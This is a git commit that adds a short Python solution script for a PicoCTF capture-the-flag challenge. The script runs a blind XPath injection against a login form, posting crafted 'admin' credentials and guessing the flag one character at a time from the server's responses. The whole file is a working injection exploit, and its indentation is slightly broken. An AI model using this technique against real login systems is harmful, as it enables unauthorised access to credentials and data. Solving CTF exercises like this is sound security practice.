bbc054fe65b5b37b955e61fb58d8adf947d94bca
7h3h4ckv157 <58929890+7h3h4ckv157@users.noreply.github.com>
2021-10-14 12:44:31 +0530

    Create web.py

---
+++ PicoCTF/X marks the spot/web.py
@@ -0,0 +1,21 @@
+import requests
+from string import *
+
+all = ascii_lowercase + ascii_uppercase + digits+"}_"
+print(all)
+
+start = ["picoCTF{"]
+while True:
+
+    for x in all:
+      
+        print(f"***checking: {''.join(start)+x}")
+        hehe = ''.join(start)+x
+        data = {"name":"admin", "pass":f"' or //*[starts-with(text(),'{hehe}')] or '1'='"}
+        r = requests.post("http://mercury.picoctf.net:53735/", data=data)
+
+        hackvist = r.text
+
+          if "You&#39;re on the right path." in hackvist:
+                start.append(x)
+                break
